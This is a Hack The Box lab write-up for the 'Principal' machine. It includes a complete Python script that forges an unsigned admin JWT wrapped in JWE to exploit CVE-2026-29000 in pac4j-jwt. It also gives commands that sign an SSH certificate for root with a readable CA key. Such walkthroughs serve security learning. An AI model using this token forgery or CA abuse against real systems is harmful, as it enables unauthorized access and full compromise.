<!-- HTB Principal writeup, Hack The Box Principal walkthrough, CVE-2026-29000 pac4j-jwt bypass, HTB medium linux writeup -->
# Principal: Hack The Box Writeup

**Machine:** Principal  
**OS:** Linux  
**Difficulty:** Medium  
**Status:** Retired  
**Date Completed:** March 2026  

---

## Summary

Principal is a medium Linux machine running a Java web application ("Principal Internal Platform") built on pac4j-jwt 6.0.3 and served by Jetty on port 8080. The attack chain exploits **CVE-2026-29000**, a critical (CVSS 10.0) authentication bypass in pac4j-jwt that allows forging admin tokens without any credentials: using only the server's RSA public key, which is intentionally exposed. Once authenticated, the API leaks an encryption key and the path to an SSH Certificate Authority. The CA private key is readable by the `svc-deploy` service account we land as, allowing us to sign our own SSH certificate for root and complete the privilege escalation.

**Key techniques:** Service fingerprinting · JavaScript source analysis · CVE-2026-29000 (JWE PlainJWT authentication bypass) · JWT/JWE manual forgery · API credential harvesting · SSH Certificate Authority abuse

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T5 10.129.244.220
```

**Results:**

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
| X-Powered-By: pac4j-jwt/6.0.3
```

Two services: SSH and a Jetty web server. The HTTP response headers immediately expose two critical details:

- X-Powered-By: pac4j-jwt/6.0.3
- The page redirects to `/login`

Knowing the exact library version (6.0.3) is immediately actionable: it falls within the affected range for CVE-2026-29000, a critical authentication bypass.

---

## Enumeration

### JavaScript Source Analysis

Navigating to `http://10.129.244.220:8080/login` presents a corporate login form. The page source references a client-side JavaScript file:

```html
<script src="/static/js/app.js"></script>
```

<img width="1743" height="869" alt="Screenshot 2026-03-18 112625" src="https://github.com/user-attachments/assets/7eaddeb8-806a-4b2c-ba93-955a77d0566a" />

Reading client-side JavaScript is standard practice: it frequently documents the API structure, authentication flow, and token handling that the server never explicitly advertises. Fetching it:

```bash
curl -s http://10.129.244.220:8080/static/js/app.js
```

The file is extensively commented and reveals everything needed to understand and exploit the authentication system:

```javascript
/**
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const JWKS_ENDPOINT    = '/api/auth/jwks';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT   = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

Critically, the login page **prefetches the JWKS without authentication**:

```javascript
if (window.location.pathname === '/login') {
    ApiClient.fetchJWKS().then(jwks => {
        window.__jwks = jwks;  // Cache JWKS for client-side token operations
    });
}
```

This means `/api/auth/jwks` is publicly accessible. Under normal circumstances exposing an RSA public key is harmless: you can only encrypt with it, not forge signatures. CVE-2026-29000 breaks that assumption entirely.

### Fetching the Public Key

```bash
curl -s http://10.129.244.220:8080/api/auth/jwks
```

```json
{
  "keys": [{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "enc-key-1",
    "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9..."
  }]
}
```

RSA public key obtained. Under CVE-2026-29000 this is all that's needed to authenticate as any user.

---

## CVE-2026-29000: Authentication Bypass

### Background: How pac4j-jwt JWE Authentication Works

pac4j is a Java security framework. In its JWE configuration, the authentication flow is:

1. Server issues a **signed JWT** (RS256) and wraps it in **JWE** (RSA-OAEP-256 + A128GCM)
2. Client sends the JWE token as `Authorization: Bearer <token>`
3. Server **decrypts** the JWE outer layer to get the inner JWT
4. Server **verifies the RS256 signature** of the inner JWT
5. Server reads claims (`sub`, `role`) and grants access

### The Vulnerability (CWE-347)

In pac4j-jwt < 4.5.9 / < 5.7.9 / < 6.3.3, step 4 has a critical flaw: **if the inner JWT declares `"alg": "none"` (a PlainJWT: unsigned), the library skips signature verification entirely**.

The server correctly decrypts the JWE outer layer, but then accepts the unsigned inner JWT as valid. Since an attacker controls the encryption (they have the public key), they can:

1. Craft any claims (`sub: admin`, `role: ROLE_ADMIN`)
2. Wrap them in a PlainJWT with `alg: none`
3. Encrypt it with the server's RSA public key
4. The server decrypts it, sees `alg: none`, and grants access anyway

The public key: normally safe to expose: becomes the only material needed to authenticate as any user. **CVSS: 10.0 Critical.**

---

## Exploitation: Forging the Admin Token

A PoC tool (`token_forge`) exists for this CVE but had three bugs against this specific target:

1. **Wrong encryption algorithm**: hardcoded `A256GCM` but this server requires `A128GCM` (documented in `app.js`)
2. **JSON whitespace**: `json.dumps()` without `separators=(',',':')` adds spaces, producing a different base64 payload
3. **Missing trailing dot**: a valid 3-part JWT structure requires an empty signature field: `header.payload.`: the tool omitted it

Rather than patching the tool, we wrote a clean exploit from scratch:

```python
import json, base64, time, requests
from jwcrypto import jwk, jwe

# Step 1: Fetch the server's RSA public key
r = requests.get("http://10.129.244.220:8080/api/auth/jwks")
key = jwk.JWK(**r.json()["keys"][0])

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Step 2: Build the inner PlainJWT: unsigned, alg: none
header  = b64url(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())
payload = b64url(json.dumps({
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}, separators=(',',':')).encode())

plain_jwt = f"{header}.{payload}."  # trailing dot = empty signature field

# Step 3: Wrap in JWE using the server's public key
protected = {"alg":"RSA-OAEP-256","enc":"A128GCM","cty":"JWT"}
token = jwe.JWE(plain_jwt.encode(), recipient=key, protected=protected)
T = token.serialize(compact=True)

# Step 4: Access protected endpoints
for ep in ["/api/dashboard", "/api/users", "/api/settings"]:
    r = requests.get(f"http://10.129.244.220:8080{ep}",
                     headers={"Authorization": f"Bearer {T}"})
    print(f"{ep} [{r.status_code}]:", json.dumps(r.json(), indent=2))
```

All three endpoints return **200 OK**.

---

## Post-Authentication Enumeration

### `/api/dashboard`

The activity log reveals SSH certificate issuance is actively happening:

```json
{
  "action": "CERT_ISSUED",
  "username": "svc-deploy",
  "details": "SSH certificate issued for deploy-1735400000"
}
```

An announcement also hints at the infrastructure:

```json
{
  "title": "New SSH CA Rotation",
  "message": "SSH CA keys have been rotated. All deploy certificates issued before Dec 1 are revoked."
}
```

### `/api/users`

Eight users enumerated. The key account:

```json
{
  "username": "svc-deploy",
  "role": "deployer",
  "department": "DevOps",
  "note": "Service account for automated deployments via SSH certificate auth."
}
```

### `/api/settings`: Critical Findings

```json
"security": {
    "authFramework": "pac4j-jwt",
    "authFrameworkVersion": "6.0.3",
    "encryptionKey": "D3pl0y_$$H_Now42!"
},
"infrastructure": {
    "sshCertAuth": "enabled",
    "sshCaPath": "/opt/principal/ssh/",
    "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."
}
```

Two critical findings:
- `encryptionKey: "D3pl0y_$$H_Now42!"`: a plaintext credential exposed in the settings API
- `/opt/principal/ssh/`: the path to the SSH Certificate Authority used for deployment automation

---

## Initial Access

Testing the exposed key as the SSH password for `svc-deploy`:

```bash
ssh svc-deploy@10.129.244.220
# Password: D3pl0y_$$H_Now42!
```

Login successful.

```bash
svc-deploy@principal:~$ cat user.txt
e0a81b21cb61db9f5d83ca8de80a7bf1
```

---

## Privilege Escalation: SSH Certificate Authority Abuse

### Enumeration

No sudo rights:

```bash
sudo -l
# Sorry, user svc-deploy may not run sudo on principal.
```

Checking the SSH CA directory flagged by `/api/settings`:

```bash
ls -la /opt/principal/ssh/
```

```
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca           ← CA private key
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub
```

The directory is owned by `root` but the `deployers` group has read access, and `svc-deploy` is a member of `deployers`. The **CA private key is readable**.

```bash
cat /opt/principal/ssh/README.txt
```

```
CA keypair for SSH certificate automation.
This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.
Key details:
  Algorithm: RSA 4096-bit
  Purpose: Automated deployment authentication
```

### Why This Is Instant Root

SSH Certificate Authentication works differently from standard key-based auth. Instead of checking `~/.ssh/authorized_keys`, the server's `sshd_config` contains:

```
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

This instructs sshd to **trust any certificate signed by this CA, for whatever principal (username) the certificate claims**. The CA's signature is treated as proof of identity: if you can sign a certificate claiming to be `root`, sshd will accept it.

We have the CA private key. We can sign a certificate for any user.

### Exploitation

On the attack machine:

```bash
# Save the CA private key
chmod 600 ca

# Generate a fresh keypair
ssh-keygen -t rsa -b 4096 -f attacker_key -N ""

# Sign our public key with the CA, issuing it as root
# -s  : signing key
# -I  : certificate identifier (arbitrary label)
# -n  : principal: the username this cert is valid for
# -V  : validity period
ssh-keygen -s ca \
    -I "root-cert" \
    -n root \
    -V +1h \
    attacker_key.pub
```

```
Signed user key attacker_key-cert.pub: id "root-cert" serial 0 for root valid from 2026-03-18T06:19:00 to 2026-03-18T07:20:07
```

```bash
# SSH as root using our signed certificate
ssh -i attacker_key \
    -o CertificateFile=attacker_key-cert.pub \
    root@10.129.244.220
```

```
root@principal:~# cat /root/root.txt
5038dd75c9676d05e71a813df0abe04c
```

---

<!-- Completion Image Here -->
<img width="1194" height="685" alt="Screenshot 2026-04-28 103727" src="https://github.com/user-attachments/assets/af765577-ae7b-4f09-bccc-04a683f9777e" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---|---|---|
| Public JWKS without authentication | `/api/auth/jwks` | RSA public key exposed to unauthenticated users |
| CVE-2026-29000: PlainJWT bypass | pac4j-jwt 6.0.3 | Full authentication bypass using public key only |
| Sensitive credential in API response | `/api/settings` → `encryptionKey` | Plaintext SSH password exposed to any authenticated session |
| SSH CA private key readable by service account | `/opt/principal/ssh/ca` | Sign certificate for any principal → root via SSH |

---

## Key Takeaways

**Read client-side JavaScript thoroughly.** `app.js` documented the entire authentication flow, claim schema, encryption algorithms, and every API endpoint. This eliminated all guesswork about how the token system worked and what parameters to forge. In real engagements, developers routinely leave far more in client-side code than they should.

**Know your CVEs.** The Nmap fingerprint gave us `pac4j-jwt/6.0.3` immediately. Recognising that version as vulnerable and understanding *why* (PlainJWT bypass inside JWE) made exploitation direct rather than exploratory.

**Public keys are not always safe.** Normally exposing an RSA public key is a non-issue. CVE-2026-29000 turns it into a full authentication bypass. The `alg: none` attack surface has existed since JWT was introduced: libraries handling JWE+JWT combinations must explicitly reject unsigned inner tokens regardless of the outer encryption.

**Don't trust PoC tools blindly.** `token_forge` had three bugs for this target. Understanding the underlying cryptography let us diagnose each failure, fix them, and ultimately write a clean exploit from scratch. If we'd only been able to run tools, we'd have been stuck.

**Enumerate API responses completely.** `/api/settings` exposed an encryption key, SSH CA path, and infrastructure notes in a single response. Internal platforms built for developers routinely over-share operational detail. Every authenticated endpoint is worth reading in full.

**Follow the breadcrumb trail.** Every privesc step was signposted by earlier data. The login page mentioned SSH certificate authentication. `/api/settings` gave the exact CA path. The directory permissions gave `svc-deploy` read access. Nothing required guessing: thorough enumeration at each stage removes the need for it at the next.

**SSH Certificate Authority access = master key.** A CA private key is categorically different from a regular SSH private key. A private key gives you access to accounts it's been added to. A CA private key gives you access to *every account on every server that trusts that CA*, for any username you choose to put in the certificate. Treat CA private keys with the same sensitivity as root passwords.

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
